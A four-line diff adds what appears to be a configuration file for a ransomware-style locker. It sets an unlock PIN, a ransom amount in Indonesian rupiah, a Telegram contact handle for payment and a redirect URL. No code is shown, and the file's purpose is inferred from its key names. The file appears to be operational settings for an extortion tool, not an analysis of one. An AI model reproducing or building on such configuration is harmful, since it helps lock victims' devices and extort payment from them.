@@ -1,0 +1,4 @@
+pin=202012
+ransomAmount=50.000IDR/50K
+telegram=@Rizzxdc
+redirectUrl=https://google.com
